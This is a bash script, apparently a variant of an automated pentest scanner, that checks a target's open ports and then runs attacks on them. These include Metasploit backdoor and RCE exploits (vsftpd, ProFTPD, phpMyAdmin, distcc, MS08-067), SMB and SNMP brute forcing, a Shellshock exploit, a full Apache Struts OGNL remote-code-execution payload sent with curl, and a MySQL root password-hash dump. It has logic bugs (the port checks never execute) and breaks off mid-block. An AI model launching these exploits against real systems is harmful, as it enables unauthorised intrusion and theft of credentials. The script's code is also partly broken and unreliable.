#!/bin/bash

DISABLE_POSTGRESQL="true" # disabling postgresql startup, assuming it's running already

#SYSTEM SETTING
declare -r application_path='Application/'
declare -r report_path='Report/'
declare -r port_analysis_path='Port_Analysis/'
declare -r bin_path='/usr/local/bin'


#Settings
USER_FILE="/usr/share/brutex/wordlists/simple-users.txt"
PASS_FILE="/usr/share/brutex/wordlists/password.lst"
SAMRDUMP="/usr/share/sniper/bin/samrdump.py"

#COLOR CODE
OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'

if [ -z $DISABLE_POSTGRESQL ]; then service postgresql start; fi


echo -e "$OKGREEN + -- ----------------------------=[Running Detailed Scans]=----------------- -- +$RESET"

port_21="grep 'portid=\"21' $PATHS | grep open"
port_22="grep 'portid=\"22' $PATHS | grep open"
port_23="grep 'portid=\"23' $PATHS | grep open"
port_25="grep 'portid=\"25' $PATHS | grep open"
port_53="grep 'portid=\"53' $PATHS | grep open"
port_79="grep 'portid=\"79' $PATHS | grep open"
port_80="grep 'portid=\"80' $PATHS | grep open"
port_110="grep 'portid=\"110' $PATHS | grep open"
port_111="grep 'portid=\"111' $PATHS | grep open"
port_135="grep 'portid=\"135' $PATHS | grep open"
port_139="grep 'portid=\"139' $PATHS | grep open"
port_161="grep 'portid=\"161' $PATHS | grep open"
port_162="grep 'portid=\"162' $PATHS | grep open"
port_389="grep 'portid=\"162' $PATHS | grep open"
port_443="grep 'portid=\"443' $PATHS | grep open"
port_445="grep 'portid=\"445' $PATHS | grep open"
port_512="grep 'portid=\"512' $PATHS | grep open"
port_513="grep 'portid=\"513' $PATHS | grep open"
port_514="grep 'portid=\"514' $PATHS | grep open"
port_623="grep 'portid=\"623' $PATHS | grep open"
port_624="grep 'portid=\"624' $PATHS | grep open"
port_1099="grep 'portid=\"1099' $PATHS | grep open"
port_1433="grep 'portid=\"1433' $PATHS | grep open"
port_1524="grep 'portid=\"1524' $PATHS | grep open"
port_2049="grep 'portid=\"2049' $PATHS | grep open"
port_2121="grep 'portid=\"2121' $PATHS | grep open"
port_3128="grep 'portid=\"3128' $PATHS | grep open"
port_3306="grep 'portid=\"3306' $PATHS | grep open"
port_3310="grep 'portid=\"3310' $PATHS | grep open"
port_3389="grep 'portid=\"3389' $PATHS | grep open"
port_3632="grep 'portid=\"3632' $PATHS | grep open"
port_4443="grep 'portid=\"4443' $PATHS | grep open"
port_5432="grep 'portid=\"5432' $PATHS | grep open"
port_5800="grep 'portid=\"5800' $PATHS | grep open"
port_5900="grep 'portid=\"5900' $PATHS | grep open"
port_5984="grep 'portid=\"5984' $PATHS | grep open"
port_6667="grep 'portid=\"6667' $PATHS | grep open"
port_8000="grep 'portid=\"8000' $PATHS | grep open"
port_8009="grep 'portid=\"8009' $PATHS | grep open"
port_8080="grep 'portid=\"8080' $PATHS | grep open"
port_8180="grep 'portid=\"8180' $PATHS | grep open"
port_8443="grep 'portid=\"8443' $PATHS | grep open"
port_8888="grep 'portid=\"8888' $PATHS | grep open"
port_10000="grep 'portid=\"10000' $PATHS | grep open"
port_16992="grep 'portid=\"16992' $PATHS | grep open"
port_27017="grep 'portid=\"27017' $PATHS | grep open"
port_27018="grep 'portid=\"27018' $PATHS | grep open"
port_27019="grep 'portid=\"27019' $PATHS | grep open"
port_28017="grep 'portid=\"28017' $PATHS | grep open"
port_49152="grep 'portid=\"49152' $PATHS | grep open"

if [ -z "$port_21" ];
then
	echo -e "$OKRED + -- --=[Port 21 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 21 opened... running tests...$RESET"	
	nmap -A -sV -Pn -sC -T5 -p 21 --script=ftp-* $TARGET
	msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"	
fi


if [ -z "$port_22" ];
then
	echo -e "$OKRED + -- --=[Port 22 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 22 opened... running tests...$RESET"
	cd $APPLICATION_PATH/ssh-audit
	python ssh-audit.py $TARGET:22
	cd $CURRENT_PATH
	nmap -A -sV -Pn -sC -T5 -p 22 --script=ssh-* $TARGET
	msfconsole -x "use scanner/ssh/ssh_enumusers; setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;"
fi

if [ -z "$port_23" ];
then
	echo -e "$OKRED + -- --=[Port 23 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 23 opened... running tests...$RESET"
	echo ""
	cisco-torch -A $TARGET
	nmap -A -sV -Pn -T5 --script=telnet* -p 23 $TARGET
	msfconsole -x "use scanner/telnet/lantronix_telnet_password; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use scanner/telnet/lantronix_telnet_version; run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run; exit;"
fi

if [ -z "$port_25" ];
then
	echo -e "$OKRED + -- --=[Port 25 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 25 opened... running tests...$RESET"
	nmap -A -sV -Pn -T5 --script=smtp* -p 25 $TARGET
	smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET
	msfconsole -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;" 
fi

if [ -z "$port_53" ];
then
	echo -e "$OKRED + -- --=[Port 53 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 53 opened... running tests...$RESET"
	nmap -A -sU -sV -Pn -T5 --script=dns* -p U:53,T:53 $TARGET	
fi

if [ -z "$port_79" ];
then
	echo -e "$OKRED + -- --=[Port 79 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 79 opened... running tests...$RESET"
	nmap -A -sV -Pn -T5 --script=finger* -p 79 $TARGET
	#bin/fingertool.sh $TARGET $USER_FILE
fi

if [ -z "$port_80" ];
then
	echo -e "$OKRED + -- --=[Port 80 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 80 opened... running tests...$RESET"
	echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
	wafw00f http://$TARGET
	echo ""
	echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
	whatweb http://$TARGET
	xsstracer $TARGET 80
	echo ""
	echo -e "$OKGREEN + -- ----------------------------=[Checking HTTP Headers]=------------------- -- +$RESET"
	echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I http://$TARGET | egrep -i 'X-Content' | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking if X-Frame options are enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I http://$TARGET | egrep -i 'X-Frame' | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking if X-XSS-Protection header is enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I http://$TARGET | egrep -i 'X-XSS' | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking HTTP methods on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I -X OPTIONS http://$TARGET | grep Allow | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking if TRACE method is enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I -X TRACE http://$TARGET | grep TRACE | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for META tags on $TARGET...$RESET $OKORANGE"
	curl -s --insecure http://$TARGET | egrep -i meta --color=auto | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for open proxy on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -x http://$TARGET:80 -L http://crowdshield.com/.testing/openproxy.txt | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Enumerating software on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I http://$TARGET | egrep -i "Server:|X-Powered|ASP|JSP|PHP|.NET" | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking if Strict-Transport-Security is enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I http://$TARGET/ | egrep -i "Strict-Transport-Security" | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for Flash cross-domain policy on $TARGET...$RESET $OKORANGE"
	curl -s --insecure http://$TARGET/crossdomain.xml | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for Silverlight cross-domain policy on $TARGET...$RESET $OKORANGE"
	curl -s --insecure http://$TARGET/clientaccesspolicy.xml | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for HTML5 cross-origin resource sharing on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I http://$TARGET | egrep -i "Access-Control-Allow-Origin" | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Retrieving robots.txt on $TARGET...$RESET $OKORANGE"
	curl -s --insecure http://$TARGET/robots.txt | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Retrieving sitemap.xml on $TARGET...$RESET $OKORANGE"
	curl -s --insecure http://$TARGET/sitemap.xml | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking cookie attributes on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I http://$TARGET | egrep -i "Cookie:" | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for ASP.NET Detailed Errors on $TARGET...$RESET $OKORANGE"
	curl -s --insecure http://$TARGET/%3f.jsp | egrep -i 'Error|Exception' | tail -n 10
	curl -s --insecure http://$TARGET/test.aspx -L | egrep -i 'Error|Exception|System.Web.' | tail -n 10
	echo ""
	echo -e "$RESET"
	echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
	echo -e "$OKRED[+]$RESET Screenshot saved to $REPORT_PATH$TARGET/screenshots/$TARGET-port80.jpg"
	cutycapt --url=http://$TARGET --out=$REPORT_PATH$TARGET/screenshots/$TARGET-port80.jpg	
	echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
	echo -e "$OKGREEN + -- ----------------------------=[Running SQLMap SQL Injection Scan]=------- -- +$RESET"
	sqlmap -u "http://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
	echo -e "$OKGREEN + -- ----------------------------=[Running PHPMyAdmin Metasploit Exploit]=--- -- +$RESET"
	msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
	echo -e "$OKGREEN + -- ----------------------------=[Running ShellShock Auto-Scan Exploit]=---- -- +$RESET"
	python $APPLICATION_PATH/shocker/shocker.py -H $TARGET --cgilist $APPLICATION_PATH/shocker/shocker-cgi_list --port 80
	echo -e "$OKGREEN + -- ----------------------------=[Running Apache Jakarta RCE Exploit]=------ -- +$RESET"
	curl -s -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" http://$TARGET | head -n 1
	echo ""
	echo -e "$RESET"
fi

if [ -z "$port_110" ];
then
	echo -e "$OKRED + -- --=[Port 110 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 110 opened... running tests...$RESET"
	nmap -A -sV  -T5 --script=pop* -p 110 $TARGET
fi

if [ -z "$port_111" ];
then
	echo -e "$OKRED + -- --=[Port 111 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 111 opened... running tests...$RESET"
	showmount -a $TARGET
	showmount -d $TARGET
	showmount -e $TARGET
fi

if [ -z "$port_135" ];
then
	echo -e "$OKRED + -- --=[Port 135 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 135 opened... running tests...$RESET"
	rpcinfo -p $TARGET
	nmap -A -p 135 -T5 --script=rpc* $TARGET
fi

if [ -z "$port_139" ];
then
	echo -e "$OKRED + -- --=[Port 139 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 139 opened... running tests...$RESET"
	SMB="1"
	echo -e "$OKGREEN + -- ----------------------------=[Running SMB Enumeration]=----------------- -- +$RESET"
	enum4linux $TARGET
	python $SAMRDUMP $TARGET
	nbtscan $TARGET
	nmap -A -sV  -T5 -p139 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smbv2-enabled --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET
	msfconsole -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; exit;"
fi

if [ -z "$port_161" ];
then
	echo -e "$OKRED + -- --=[Port 161 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 161 opened... running tests...$RESET"
	for a in `cat /usr/share/brutex/wordlists/snmp-strings.txt`; do snmpwalk $TARGET -c $a; done;
	nmap -sU -p 161 --script=snmp* $TARGET
fi

if [ -z "$port_162" ];
then
	echo -e "$OKRED + -- --=[Port 162 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 162 opened... running tests...$RESET"
	for a in `cat /usr/share/brutex/wordlists/snmp-strings.txt`; do snmpwalk $TARGET -c $a; done;
	nmap -A -p 162 -Pn --script=snmp* $TARGET
fi

if [ -z "$port_389" ];
then
	echo -e "$OKRED + -- --=[Port 389 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 389 opened... running tests...$RESET"
	nmap -A -p 389 -Pn -T5 --script=ldap* $TARGET
fi

if [ -z "$port_443" ];
then
	echo -e "$OKRED + -- --=[Port 443 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 443 opened... running tests...$RESET"
	echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
	wafw00f https://$TARGET
	echo ""
	echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
	whatweb https://$TARGET
	echo ""
	echo -e "$OKGREEN + -- ----------------------------=[Gathering SSL/TLS Info]=------------------ -- +$RESET"
	sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET
	sslscan --no-failed $TARGET 
	testssl $TARGET
	echo ""
	cd $APPLICATION_PATH/MassBleed
	./massbleed $TARGET port 443
	cd $CURRENT_PATH
	echo -e "$OKGREEN + -- ----------------------------=[Checking HTTP Headers]=------------------- -- +$RESET"
	echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I https://$TARGET | egrep -i 'X-Content' | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking if X-Frame options are enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I https://$TARGET | egrep -i 'X-Frame' | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking if X-XSS-Protection header is enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I https://$TARGET | egrep -i 'X-XSS' | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking HTTP methods on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I -X OPTIONS https://$TARGET | grep Allow
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking if TRACE method is enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I -X TRACE https://$TARGET | grep TRACE
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for META tags on $TARGET...$RESET $OKORANGE"
	curl -s --insecure https://$TARGET | egrep -i meta --color=auto | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for open proxy on $TARGET...$RESET $OKORANGE"
	curl -x https://$TARGET:443 -L https://crowdshield.com/.testing/openproxy.txt -s --insecure | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Enumerating software on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I https://$TARGET | egrep -i "Server:|X-Powered|ASP|JSP|PHP|.NET" | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking if Strict-Transport-Security is enabled on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I https://$TARGET/ | egrep -i "Strict-Transport-Security" | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for Flash cross-domain policy on $TARGET...$RESET $OKORANGE"
	curl -s --insecure https://$TARGET/crossdomain.xml | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for Silverlight cross-domain policy on $TARGET...$RESET $OKORANGE"
	curl -s --insecure https://$TARGET/clientaccesspolicy.xml | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for HTML5 cross-origin resource sharing on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I https://$TARGET | egrep -i "Access-Control-Allow-Origin" | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Retrieving robots.txt on $TARGET...$RESET $OKORANGE"
	curl -s --insecure https://$TARGET/robots.txt | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Retrieving sitemap.xml on $TARGET...$RESET $OKORANGE"
	curl -s --insecure https://$TARGET/sitemap.xml | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking cookie attributes on $TARGET...$RESET $OKORANGE"
	curl -s --insecure -I https://$TARGET | egrep -i "Cookie:" | tail -n 10
	echo ""
	echo -e "$OKBLUE+ -- --=[Checking for ASP.NET Detailed Errors on $TARGET...$RESET $OKORANGE"
	curl -s --insecure https://$TARGET/%3f.jsp | egrep -i 'Error|Exception' | tail -n 10
	curl -s --insecure https://$TARGET/test.aspx -L | egrep -i 'Error|Exception|System.Web.' | tail -n 10
	echo ""
	echo -e "$RESET"
	echo -e "$OKGREEN + -- ----------------------------=[Running Web Vulnerability Scan]=---------- -- +$RESET"
	nikto -h https://$TARGET 
	echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
	cutycapt --url=https://$TARGET --out=$REPORT_PATH$TARGET/screenshots/$TARGET-port443.jpg
	echo -e "$OKRED[+]$RESET Screenshot saved to $REPORT_PATH$TARGET/screenshots/$TARGET-port443.jpg"	
	echo -e "$OKGREEN + -- ----------------------------=[Running SQLMap SQL Injection Scan]=------- -- +$RESET"
	sqlmap -u "https://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
	echo -e "$OKGREEN + -- ----------------------------=[Running PHPMyAdmin Metasploit Exploit]=--- -- +$RESET"
	msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
	echo -e "$OKGREEN + -- ----------------------------=[Running ShellShock Auto-Scan Exploit]=---- -- +$RESET"
	python $APPLICATION_PATH/shocker/shocker.py -H $TARGET --cgilist $APPLICATION_PATH/shocker/shocker-cgi_list --port 443 --ssl
	echo -e "$OKGREEN + -- ----------------------------=[Running Apache Jakarta RCE Exploit]=------ -- +$RESET"
	curl -s -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" https://$TARGET | head -n 1
fi

if [ -z "$port_445" ];
then
	echo -e "$OKRED + -- --=[Port 445 closed... skipping.$RESET"
elif [ $SMB = "1" ];
then
	echo -e "$OKRED + -- --=[Port 445 scanned... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 445 opened... running tests...$RESET"
	enum4linux $TARGET
	#python $SAMRDUMP $TARGET
	nbtscan $TARGET
	nmap -A -sV -Pn -T5 -p445 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smbv2-enabled --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET
	msfconsole -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; exit;"
fi

if [ -z "$port_512" ];
then
	echo -e "$OKRED + -- --=[Port 512 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 512 opened... running tests...$RESET"
	nmap -A -sV -Pn -T5 -p 512 --script=rexec* $TARGET
fi

if [ -z "$port_513" ]
then
	echo -e "$OKRED + -- --=[Port 513 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 513 opened... running tests...$RESET"
	nmap -A -sV -T5 -Pn -p 513 --script=rlogin* $TARGET
fi

if [ -z "$port_514" ];
then
	echo -e "$OKRED + -- --=[Port 514 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 514 opened... running tests...$RESET"
	amap $TARGET 514 -A
fi

if [ -z "$port_623" ];
then
	echo -e "$OKRED + -- --=[Port 623 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 623 opened... running tests...$RESET"
	amap $TARGET 623 -A
	nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 623 $TARGET
fi

if [ -z "$port_624" ];
then
	echo -e "$OKRED + -- --=[Port 624 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 624 opened... running tests...$RESET"
	amap $TARGET 624 -A
	nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 624 $TARGET
fi

if [ -z "$port_1099" ];
then
	echo -e "$OKRED + -- --=[Port 1099 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 1099 opened... running tests...$RESET"
	amap $TARGET 1099 -A
	nmap -A -sV -Pn -T5 -p 1099 --script=rmi-* $TARGET
	msfconsole -x "use gather/java_rmi_registry; set RHOST "$TARGET"; run;"
	msfconsole -x "use scanner/misc/java_rmi_server; set RHOST "$TARGET"; run;"
fi

if [ -z "$port_1433" ];
then
	echo -e "$OKRED + -- --=[Port 1433 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 1433 opened... running tests...$RESET"
	nmap -A -sV -Pn -T5 --script=ms-sql* -p 1433 $TARGET
fi

if [ -z "$port_2049" ];
then
	echo -e "$OKRED + -- --=[Port 2049 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 2049 opened... running tests...$RESET"
	nmap -A -sV -Pn -T5 --script=nfs* -p 2049 $TARGET
	rpcinfo -p $TARGET
	showmount -e $TARGET
	smbclient -L $TARGET -U " "%" "
fi

if [ -z "$port_2121" ];
then
	echo -e "$OKRED + -- --=[Port 2121 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 2121 opened... running tests...$RESET"
	nmap -A -sV -Pn -T5 --script=ftp* -p 2121 $TARGET
	msfconsole -x "setg PORT 2121; use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
fi

if [ -z "$port_3306" ];
then
	echo -e "$OKRED + -- --=[Port 3306 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 3306 opened... running tests...$RESET"
	nmap -A -sV -Pn --script=mysql* -p 3306 $TARGET
	mysql -u root -h $TARGET -e 'SHOW DATABASES; SELECT Host,User,Password FROM mysql.user;'
fi

if [ -z "$port_3310" ];
then
	echo -e "$OKRED + -- --=[Port 3310 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 3310 opened... running tests...$RESET"
	nmap -A -p 3310 -Pn -T5 -sV  --script clamav-exec $TARGET
fi

if [ -z "$port_3128" ];
then
	echo -e "$OKRED + -- --=[Port 3128 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 3128 opened... running tests...$RESET"
	nmap -A -p 3128 -Pn -T5 -sV  --script=*proxy* $TARGET
fi

if [ -z "$port_3389" ];
then
	echo -e "$OKRED + -- --=[Port 3389 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 3389 opened... running tests...$RESET"
	nmap -A -sV -Pn -T5 --script=rdp-* -p 3389 $TARGET
	rdesktop $TARGET &
fi

if [ -z "$port_3632" ];
then
	echo -e "$OKRED + -- --=[Port 3632 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 3632 opened... running tests...$RESET"
	nmap -A -sV -Pn -T5 --script=distcc-* -p 3632 $TARGET
	msfconsole -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use unix/misc/distcc_exec; run; exit;"
fi

if [ -z "$port_5432" ];
then
	echo -e "$OKRED + -- --=[Port 5432 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 5432 opened... running tests...$RESET"
	nmap -A -sV -Pn --script=pgsql-brute -p 5432 $TARGET
fi

if [ -z "$port_5800" ];
then
	echo -e "$OKRED + -- --=[Port 5800 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 5800 opened... running tests...$RESET"
	nmap -A -sV -Pn -T5 --script=vnc* -p 5800 $TARGET
fi

if [ -z "$port_5900" ];
then
	echo -e "$OKRED + -- --=[Port 5900 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 5900 opened... running tests...$RESET"
	nmap -A -sV  -T5 --script=vnc* -p 5900 $TARGET
fi

if [ -z "$port_5984" ];
then
	echo -e "$OKRED + -- --=[Port 5984 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 5984 opened... running tests...$RESET"
	nmap -A -sV -Pn -T5 --script=couchdb* -p 5984 $TARGET
	msfconsole -x "use auxiliary/scanner/couchdb/couchdb_enum; set RHOST "$TARGET"; run; exit;"
fi

if [ -z "$port_6000" ];
then
	echo -e "$OKRED + -- --=[Port 6000 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 6000 opened... running tests...$RESET"
	nmap -A -sV -Pn -T5 --script=x11* -p 6000 $TARGET
	msfconsole -x "use auxiliary/scanner/x11/open_x11; set RHOSTS "$TARGET"; exploit;"
fi

if [ -z "$port_6667" ];
then
	echo -e "$OKRED + -- --=[Port 6667 closed... skipping.$RESET"
else
